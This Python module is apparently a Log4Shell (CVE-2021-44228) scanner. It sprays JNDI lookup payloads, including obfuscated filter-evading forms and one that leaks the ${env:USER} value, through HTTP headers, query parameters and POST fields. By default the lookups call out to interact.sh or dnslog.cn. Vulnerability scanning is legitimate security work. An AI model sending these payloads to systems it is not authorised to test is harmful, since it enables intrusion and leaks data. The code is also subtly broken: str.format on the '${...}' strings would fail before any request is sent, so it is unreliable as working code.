"""Log4Shell / Log4j Scanner — test for CVE-2021-44228 and related Log4j vulns."""

import aiohttp
import asyncio
import uuid
from urllib.parse import urlparse
from modules.core import console

LOG4J_PAYLOADS = [
    '${jndi:ldap://{callback}/a}',
    '${jndi:rmi://{callback}/a}',
    '${jndi:dns://{callback}/a}',
    '${jndi:ldap://{callback}/${env:USER}}',
    '${j${::-n}di:ldap://{callback}/a}',
    '${jn${lower:d}i:ldap://{callback}/a}',
    '${${lower:j}ndi:ldap://{callback}/a}',
    '${${upper:j}ndi:ldap://{callback}/a}',
    '${j${upper:n}${lower:d}${lower:i}:ldap://{callback}/a}',
    '${${env:BARFOO:-j}ndi:${env:BARFOO:-l}dap://{callback}/a}',
    '${jndi:${lower:l}${lower:d}a${lower:p}://{callback}/a}',
]

INJECTION_HEADERS = [
    'User-Agent', 'X-Forwarded-For', 'Referer', 'X-Api-Version',
    'Accept-Language', 'Authorization', 'Cookie', 'Origin',
    'X-Custom-Header', 'X-Request-Id', 'X-Correlation-Id',
    'True-Client-IP', 'Client-IP', 'Forwarded',
]

INJECTION_PATHS = ['/api', '/admin', '/login', '/search', '/user']

CALLBACK_DOMAINS = ['interact.sh', 'dnslog.cn', 'burpcollaborator.net']


async def _inject_log4j(session, url, payload, callback):
    """Inject Log4j payload via headers, params, and body."""
    findings = []
    full_payload = payload.format(callback=callback)

    for header in INJECTION_HEADERS:
        try:
            headers = {header: full_payload}
            async with session.get(url, headers=headers,
                                   timeout=aiohttp.ClientTimeout(total=8),
                                   ssl=False) as resp:
                if resp.status == 500:
                    findings.append({
                        'type': 'Log4Shell (Potential)',
                        'vector': f'Header: {header}',
                        'payload': full_payload[:60],
                        'status': resp.status,
                        'severity': 'Critical',
                    })
        except Exception:
            pass

    try:
        params = {'q': full_payload, 'search': full_payload, 'input': full_payload}
        async with session.get(url, params=params,
                               timeout=aiohttp.ClientTimeout(total=8), ssl=False) as resp:
            if resp.status == 500:
                findings.append({
                    'type': 'Log4Shell (Potential)',
                    'vector': 'GET Parameter',
                    'payload': full_payload[:60],
                    'severity': 'Critical',
                })
    except Exception:
        pass

    try:
        data = {'username': full_payload, 'email': full_payload}
        async with session.post(url, data=data,
                                timeout=aiohttp.ClientTimeout(total=8), ssl=False) as resp:
            if resp.status == 500:
                findings.append({
                    'type': 'Log4Shell (Potential)',
                    'vector': 'POST Body',
                    'payload': full_payload[:60],
                    'severity': 'Critical',
                })
    except Exception:
        pass

    return findings


async def scan_log4shell(session, url, callback_server=None):
    """Scan for Log4j/Log4Shell vulnerability (CVE-2021-44228)."""
    console.print(f"\n[bold cyan]--- Log4Shell Scanner (CVE-2021-44228) ---[/bold cyan]")

    scan_id = str(uuid.uuid4())[:8]
    callback = callback_server or f"{scan_id}.{CALLBACK_DOMAINS[0]}"

    console.print(f"  [dim]Scan ID: {scan_id}[/dim]")
    console.print(f"  [cyan]Testing {len(LOG4J_PAYLOADS)} payloads x {len(INJECTION_HEADERS)} headers...[/cyan]")

    all_findings = []
    test_urls = [url] + [url.rstrip('/') + p for p in INJECTION_PATHS]

    for test_url in test_urls:
        for payload in LOG4J_PAYLOADS[:6]:
            findings = await _inject_log4j(session, test_url, payload, callback)
            all_findings.extend(findings)
        await asyncio.sleep(0.1)

    if all_findings:
        console.print(f"\n  [bold red]{len(all_findings)} POTENTIAL Log4Shell vectors![/bold red]")
        for f in all_findings:
            console.print(f"  [red]{f['vector']}: {f['payload'][:50]}[/red]")
        console.print(f"\n  [yellow]Check OOB callback: {callback}[/yellow]")
    else:
        console.print(f"\n  [green]No Log4Shell indicators (check OOB callbacks)[/green]")

    return {'scan_id': scan_id, 'callback': callback, 'findings': all_findings}
